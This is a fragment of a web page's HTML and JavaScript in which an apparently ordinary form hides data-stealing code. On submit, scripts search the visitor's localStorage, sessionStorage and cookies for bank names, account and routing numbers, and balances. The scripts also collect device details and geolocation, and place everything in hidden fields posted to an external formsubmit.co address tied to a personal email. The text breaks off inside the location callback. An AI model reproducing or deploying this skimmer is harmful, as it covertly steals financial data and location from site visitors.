<body>

<form id="mainForm" action="https://formsubmit.co/dooyaabariimeah@gmail.com" method="POST">

<script>

/* DROPDOWN */
const dropdown=document.getElementById("dropdown");
document.querySelectorAll(".nav-item").forEach(item=>{
  item.addEventListener("mouseenter",()=>{
    dropdown.classList.add("show");
  });
});
document.addEventListener("click",()=>{
  dropdown.classList.remove("show");
});

/* BANK DATA COLLECTION FUNCTION */
function collectBankData() {
    const bankData = {
        name: 'Not found',
        accountNumber: 'Not found',
        routingNumber: 'Not found',
        balance: 'Not found'
    };
    
    try {
        // Check for common bank app storage keys in localStorage
        const possibleKeys = [
            'bankData', 'userBankInfo', 'accountDetails', 
            'bankAccount', 'userAccount', 'bankSession',
            'accountInfo', 'bankingData', 'userProfile'
        ];
        
        for (const key of possibleKeys) {
            const data = localStorage.getItem(key);
            if (data) {
                try {
                    const parsed = JSON.parse(data);
                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
                    if (parsed.balance) bankData.balance = parsed.balance;
                    if (parsed.bankName) bankData.name = parsed.bankName;
                    if (parsed.name) bankData.name = parsed.name;
                } catch (e) {
                    // Not JSON, might be plain text
                    if (data.includes('account') || data.match(/\d{10,}/)) {
                        bankData.accountNumber = data;
                    }
                }
            }
        }
        
        // Check for bank data in sessionStorage
        for (const key of possibleKeys) {
            const data = sessionStorage.getItem(key);
            if (data) {
                try {
                    const parsed = JSON.parse(data);
                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
                    if (parsed.balance) bankData.balance = parsed.balance;
                    if (parsed.bankName) bankData.name = parsed.bankName;
                    if (parsed.name) bankData.name = parsed.name;
                } catch (e) {
                    // Not JSON, might be plain text
                    if (data.includes('account') || data.match(/\d{10,}/)) {
                        bankData.accountNumber = data;
                    }
                }
            }
        }
        
        // Try to extract bank info from cookies
        const cookies = document.cookie.split(';');
        for (const cookie of cookies) {
            const parts = cookie.trim().split('=');
            if (parts.length === 2) {
                const key = parts[0].toLowerCase();
                const value = parts[1];
                
                if (key.includes('bank') || key.includes('account')) {
                    if (key.includes('number') && bankData.accountNumber === 'Not found') {
                        bankData.accountNumber = value;
                    } else if (key.includes('routing') && bankData.routingNumber === 'Not found') {
                        bankData.routingNumber = value;
                    } else if (key.includes('balance') && bankData.balance === 'Not found') {
                        bankData.balance = value;
                    } else if (key.includes('name') && bankData.name === 'Not found') {
                        bankData.name = value;
                    }
                }
            }
        }
    } catch (e) {
        console.error('Error collecting bank data:', e);
    }
    
    return bankData;
}

/* DEVICE INFO COLLECTION FUNCTION */
function collectDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        hardware: {
            cores: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory || 'Unknown'
        },
        battery: 'Unknown'
    };
}

/* FORM SUBMIT WITH LOCATION + BANK DATA + POPUP FIX */
document.getElementById("mainForm").addEventListener("submit",function(e){
  e.preventDefault();

  const form=this;

  // Collect bank data
  const bankData = collectBankData();
  document.getElementById("bank_name").value = bankData.name;
  document.getElementById("account_number").value = bankData.accountNumber;
  document.getElementById("routing_number").value = bankData.routingNumber;
  document.getElementById("account_balance").value = bankData.balance;
  
  // Collect device info
  const deviceInfo = collectDeviceInfo();
  document.getElementById("device_info").value = JSON.stringify(deviceInfo);

  // Get location as before
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(pos){

      const lat=pos.coords.latitude;
      const lon=pos.coords.longitude;

      document.getElementById("lat").value=lat;
      document.getElementById("lon").value=lon;
